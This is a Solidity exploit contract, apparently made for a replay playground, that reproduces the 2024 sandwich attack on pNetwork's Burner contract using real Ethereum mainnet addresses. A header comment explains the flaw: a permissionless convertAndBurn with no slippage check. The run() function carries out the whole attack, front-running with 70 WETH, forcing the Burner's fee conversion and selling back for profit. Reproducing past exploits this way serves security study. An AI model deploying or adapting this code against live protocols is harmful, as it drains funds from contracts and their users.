// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-05-Burner).
// The DeFiHackLabs PoC (test/Burner_exp.sol) runs the whole attack INLINE in the
// Foundry `ContractTest is Test` contract (attacker = address(this)) — there is
// no standalone exploit contract to deploy. This file is a faithful,
// self-contained copy of that inline attack (testExploit's body moved into
// run()) so the playground can deploy it and record run(). Logic, addresses,
// and amounts are copied verbatim from test/Burner_exp.sol.
//
// Root cause: pNetwork's Burner.convertAndBurn(tokens[]) is PUBLIC (no
// onlyOwner/keeper guard) and its internal Kyber trade uses
// minConversionRate = 1 (effectively zero slippage protection). Kyber routed
// PNT buys through a thin PNT/WETH UniswapV2 pool at the time, so an attacker
// sandwiches the forced conversion: buy PNT with 70 WETH to crash its price /
// inflate the pool's WETH reserve, trigger convertAndBurn() so the Burner
// converts its ETH/WBTC/USDT fees into PNT at the now-terrible price, then
// sell the PNT bought in step 1 back into the pool — pulling out more WETH
// than was put in.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IWETH is IERC20 {
    function deposit() external payable;
}

interface IUniswapV2Router {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IBurner {
    function convertAndBurn(address[] calldata tokens) external;
}

contract BurnerSandwich {
    // --- addresses (Ethereum mainnet) ---
    IBurner constant burner_ = IBurner(0x4d4d05e1205e3A412ae1469C99e0d954113aa76F);
    IERC20 constant usdt_ = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20 constant wbtc_ = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
    IERC20 constant pnt_ = IERC20(0x89Ab32156e46F46D02ade3FEcbe5Fc4243B9AAeD);
    IWETH constant weth_ = IWETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));

    IUniswapV2Router constant router_ =
        IUniswapV2Router(payable(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D));

    // run() is payable; the caller fronts 70 WETH worth of native ETH
    // (simulated flash-loan working capital), copied verbatim from
    // testExploit()'s `vm.deal(address(this), 70 ether)`.
    function run() external payable {
        weth_.deposit{value: 70 ether}();
        weth_.approve(address(router_), type(uint256).max);
        pnt_.approve(address(router_), type(uint256).max);

        // step 1: front-run — buy PNT with 70 WETH, crashing PNT's price and
        // inflating the thin PNT/WETH pool's WETH reserve.
        address[] memory path = new address[](2);
        path[0] = address(weth_);
        path[1] = address(pnt_);
        router_.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            weth_.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );

        // step 2: trigger the victim — convertAndBurn() is permissionless, so
        // anyone can force the Burner to convert its accumulated ETH/WBTC/USDT
        // fees into PNT via Kyber with minConversionRate = 1 (no slippage
        // check), at the now-terrible attacker-skewed price.
        address[] memory tokens = new address[](3);
        tokens[0] = address(0x0);
        tokens[1] = address(wbtc_);
        tokens[2] = address(usdt_);
        burner_.convertAndBurn(tokens);

        // step 3: back-run — sell the PNT bought in step 1 back into the now
        // WETH-rich pool, pulling out more WETH than was put in.
        path[0] = address(pnt_);
        path[1] = address(weth_);
        router_.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            pnt_.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );

        // step 4: repay the simulated 70 ETH flash loan; the leftover WETH is
        // pure profit, left in-contract.
        weth_.transfer(address(0x01), 70 ether);
    }

    receive() external payable {}
}
